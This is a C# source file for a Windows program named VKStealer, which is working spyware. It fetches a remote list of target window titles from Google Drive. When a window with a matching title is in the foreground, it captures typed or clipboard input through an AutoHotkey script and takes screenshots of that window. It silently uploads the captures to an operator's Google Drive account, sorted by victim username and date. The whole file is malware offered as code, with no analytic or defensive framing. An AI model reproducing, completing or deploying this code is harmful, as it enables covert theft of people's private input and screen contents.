using System;
using AutoHotkey.Interop;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Linq;
using IO = System.IO;
using System.Net;
using System.Xml.Linq;
using System.Collections.Generic;
using Google.Apis.Auth.OAuth2;
using Google.Apis.Drive.v2;
using Google.Apis.Services;
using Google.Apis.Drive.v2.Data;
using System.Security.Cryptography.X509Certificates;
using System.Configuration;
using System.Threading.Tasks;
using System.ComponentModel;
using System.Drawing.Imaging;
using Google.Apis.Upload;

namespace VKStealer
{
    public partial class Form1 : Form
    {
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int description, int reservedValue);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr name, StringBuilder text, int count);

        [DllImport("user32.dll", SetLastError = true)]
        static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        public Form1()
        {
            InitializeComponent();
            int description;
            while (!InternetGetConnectedState(out description, 0))
            {

            }
            try
            {
                WebClient client = new WebClient();
                client.DownloadFileCompleted += client_DownloadFileCompleted;
                client.DownloadFileAsync(new Uri("https://drive.google.com/uc?authuser=0&id=1Uu0tgRoez50AIE0ivSvyldh9UiIf50ED&export=download"), "titles.xml");
            }
            catch
            {

            }
        }

        private void client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
            try
            {
                XDocument doc = XDocument.Load("titles.xml");
                List<string> listScreen = new List<string>();
                foreach (XElement item in doc.Element("titles").Element("screen").Elements("title"))
                {
                    listScreen.Add(item.Value);
                }
                List<string> listData = new List<string>();
                foreach (XElement item in doc.Element("titles").Element("data").Elements("title"))
                {
                    listData.Add(item.Value);
                }
                IO.File.Delete("titles.xml");
                if (listScreen.Count > 0 || listData.Count > 0)
                {
                    DriveService service = CreateService();
                    if (service != null)
                    {
                        AutoHotkeyEngine autoHotKeyEngine = AutoHotkeyEngine.Instance;
                        try
                        {
                            autoHotKeyEngine.LoadFile(ConfigurationManager.AppSettings["scriptPath"]);
                        }
                        catch 
                        {
                            listData.Clear();
                        } 
                        while (true)
                        {
                            IntPtr handle = GetForegroundWindow();
                            string title = GetActiveWindowTitle(handle);
                            if (title != null)
                            {
                                if (listData.Count > 0)
                                {
                                    string windowTitle = listData.FirstOrDefault(x => title.Contains(x));
                                    if (windowTitle != null)
                                    {
                                        string input = autoHotKeyEngine.ExecFunction("InputClip");
                                        if (input != string.Empty)
                                        {
                                            using (IO.MemoryStream stream = new IO.MemoryStream())
                                            {
                                                byte[] buffer = Encoding.UTF8.GetBytes(input);
                                                stream.Write(buffer, 0, buffer.Length);
                                                UploadFile(service, stream, DateTime.Now.ToString("HH_mm_ss_ffffff") + ".txt", "image/plain", windowTitle);
                                            }
                                        }
                                    } 
                                }
                                if (listScreen.Count > 0)
                                {
                                    string windowTitle = listScreen.FirstOrDefault(x => title.Contains(x));
                                    if (windowTitle != null)
                                    {
                                        using (IO.MemoryStream stream = new IO.MemoryStream())
                                        {
                                            ImageFromScreen(handle).Save(stream, ImageFormat.Png);
                                            UploadFile(service, stream, DateTime.Now.ToString("HH_mm_ss_ffffff") + ".png", "image/png", windowTitle);
                                        }
                                        Thread.Sleep(10000);
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch
            {

            }
            finally
            {
                Close();
            }
        }

        private string GetActiveWindowTitle(IntPtr handle)
        {
            const int count = 256;
            StringBuilder buff = new StringBuilder(count);
            try
            {
                if (GetWindowText(handle, buff, count) > 0)
                {
                    return buff.ToString();
                }
                else throw new Exception();
            }
            catch (Exception)
            {
                return null;
            }
        }

        private Bitmap ImageFromScreen(IntPtr handle)
        {
            RECT rect;
            if (!GetWindowRect(handle, out rect))
            {
                return null;
            }
            Rectangle rectangle = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left + 1, rect.Bottom - rect.Top + 1);
            Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height);
            Graphics.FromImage((Image)bitmap).CopyFromScreen(rectangle.X, rectangle.Y, 0, 0, rectangle.Size);
            return bitmap;
        }

        private DriveService CreateService()
        {
            try
            {
                return new DriveService(new BaseClientService.Initializer()
                {
                    HttpClientInitializer = new ServiceAccountCredential(new ServiceAccountCredential.Initializer(ConfigurationManager.AppSettings["idService"])
                    {
                        Scopes = new string[] { DriveService.Scope.Drive }
                    }.FromCertificate(new X509Certificate2(ConfigurationManager.AppSettings["fileNameCertificate"], ConfigurationManager.AppSettings["password"], X509KeyStorageFlags.Exportable))),
                    ApplicationName = ConfigurationManager.AppSettings["appName"]
                });
            }
            catch
            {
                return null;
            }

        }

        private List<ParentReference> Convert(string[] parents)
        {
            if (parents != null && parents.Length > 0)
            {
                List<ParentReference> parentsList = new List<ParentReference>(parents.Length);
                foreach (string item in parents)
                {
                    parentsList.Add(new ParentReference() { Id = item });
                }
                return parentsList;
            }
            return null;
        }

        private string CreateFolder(DriveService driveService, string fileName, string[] parents = null)
        {
            try
            {
                File fileMetadata = new File()
                {
                    Title = fileName,
                    MimeType = "application/vnd.google-apps.folder",
                    Parents = Convert(parents)
                };
                FilesResource.InsertRequest request = driveService.Files.Insert(fileMetadata);
                request.Fields = "id";
                return request.Execute().Id;
            }
            catch
            {
                return null;
            }
        }

        private string SearchFolder(DriveService driveService, string fileName, string[] parents = null)
        {
            try
            {
                FilesResource.ListRequest request = driveService.Files.List();
                request.Q = "mimeType = 'application/vnd.google-apps.folder'";
                request.Fields = "items(id,title,parents)";
                FileList fileList = request.Execute();
                File file;
                if (parents == null)
                {
                    file = fileList.Items.FirstOrDefault(x => x.Title.Equals(fileName) && x.Parents.Count == 1 && x.Parents[0].IsRoot == true);
                }
                else
                {
                    file = fileList.Items.FirstOrDefault(x => x.Title.Equals(fileName) && x.Parents != null && x.Parents[0].Id.Equals((Convert(parents))[0].Id));
                }
                if (file == null)
                {
                    return null;
                }
                return file.Id;
            }
            catch
            {
                return null;
            }
        }

        private void UploadFile(DriveService service, IO.MemoryStream stream, string fileName, string mimeType, string windowTitle)
        {
            string folderVKStealerID = SearchFolder(service, "VKStealer");
            if (folderVKStealerID == null)
            {
                folderVKStealerID = CreateFolder(service, "VKStealer");
            }
            if (folderVKStealerID != null)
            {
                string folderUserID = SearchFolder(service, Environment.UserName, new string[] { folderVKStealerID });
                if (folderUserID == null)
                {
                    folderUserID = CreateFolder(service, Environment.UserName, new string[] { folderVKStealerID });
                }
                if (folderUserID != null)
                {
                    string folderDateID = SearchFolder(service, DateTime.Now.ToShortDateString(), new string[] { folderUserID });
                    if (folderDateID == null)
                    {
                        folderDateID = CreateFolder(service, DateTime.Now.ToShortDateString(), new string[] { folderUserID });
                    }
                    if (folderDateID != null)
                    {
                        File fileMetadata = new File()
                        {
                            Title = fileName,
                            Description = string.Format("Название окна: {0}", windowTitle),
                            Parents = new List<ParentReference>()
                            {
                                new ParentReference()
                                {
                                    Id = folderDateID
                                }
                            }
                        };
                        try
                        {
                            FilesResource.InsertMediaUpload request = service.Files.Insert(fileMetadata, stream, mimeType);
                            request.Fields = "id";
                            request.Upload();
                        }
                        catch
                        {

                        }
                    }
                }
            }
        }
    }
}